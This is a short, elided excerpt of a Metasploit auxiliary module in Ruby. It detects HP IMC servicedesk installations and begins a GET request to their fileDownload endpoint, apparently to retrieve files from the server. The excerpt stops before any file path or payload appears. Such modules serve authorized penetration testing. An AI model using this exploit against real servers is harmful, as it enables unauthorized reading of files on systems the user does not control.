...
class MetasploitModule < Msf::Auxiliary
  ...
  def is_imc_som?
    res = send_request_cgi('uri' => normalize_uri("servicedesk", "ServiceDesk.jsp"),
                           'method' => 'GET')

    if res && (res.code == 200) && res.body =~ /servicedesk\/servicedesk/i
      return true
    else
      return false
    end
  ...
  def run_host(ip)
    ...
    res = send_request_cgi('uri' => normalize_uri("servicedesk", "servicedesk", "fileDownload"),
                           'method'       => 'GET',
                           'vars_get'     =>
        {
          'OperType' => '2',
